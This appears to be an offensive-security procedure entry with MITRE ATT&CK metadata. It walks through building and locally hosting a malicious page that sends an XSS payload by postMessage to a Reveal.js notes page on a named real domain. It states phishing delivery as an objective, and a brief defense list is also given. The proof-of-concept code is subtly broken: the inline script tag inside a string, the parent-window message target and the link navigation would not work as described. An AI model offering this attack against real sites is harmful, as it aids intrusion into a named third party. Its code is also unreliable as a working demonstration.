---
tags:
  - xss
  - dom-xss
  - postmessage
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:47:12.864Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: be34a40d-f869-4614-9de9-17a8b851fc4f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Setup-Malicious-POC-Page-for-postMessage

## Summary

This procedure creates a malicious HTML page that sends a crafted postMessage to the target domain (talks.lystit.com), exploiting the insecure event handler in the notes plugin to inject XSS payload.

## Description

The attack involves hosting an HTML file with JavaScript that constructs a JSON payload containing malicious notes with an embedded script tag. When the victim loads this page and interacts (e.g., clicks a link), it sends the postMessage to the vulnerable origin without validation checks, allowing the payload to be parsed and injected via innerHTML. This targets the Reveal.js-based presentation notes.html file, leading to JavaScript execution in the context of the Lyst domain.

## Requirements

1. Web browser for testing
2. Local server to host the HTML file (e.g., Python3 -m http.server 8000)
3. Knowledge of the target URL: http://talks.lystit.com/data-saloon-presentation/plugin/notes/notes.html

## Defense

Defensive measures and detection strategies:

- Validate event.origin in postMessage handlers to match trusted domains
- Sanitize parsed data before setting innerHTML (use textContent or DOMPurify)
- Monitor for unexpected postMessage events in browser dev tools

## Objectives

1. Prepare a deliverable malicious page for social engineering or phishing
2. Craft payload to evade basic filters and execute JS
3. Demonstrate exploitation in a controlled environment

## Instructions

### Step 1: Create the Malicious HTML File

**Context**: Write an HTML file that includes JavaScript to send the postMessage with a JSON payload embedding an XSS script.

**Instructions**: Save the following as lyst_1.html and open in a browser:

```html
<!DOCTYPE html>
<html>
<head><title>POC</title></head>
<body>
  <a href="http://talks.lystit.com/data-saloon-presentation/plugin/notes/notes.html" id="trigger">Click to view presentation</a>
  <script>
    document.getElementById('trigger').addEventListener('click', function() {
      var payload = { notes: '<script>alert("XSS via postMessage")</script>' };
      window.parent.postMessage(JSON.stringify(payload), 'http://talks.lystit.com');
    });
  </script>
</body>
</html>
```

> This script sends the payload on link click, targeting the vulnerable domain.

### Step 2: Host the Page Locally

**Context**: Serve the file to simulate a remote malicious site.

**Instructions**: Run a local server in the directory containing lyst_1.html:

```bash
python3 -m http.server 8000
```

> Access via http://localhost:8000/lyst_1.html; the page should load with the link.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- postmessage
- javascript
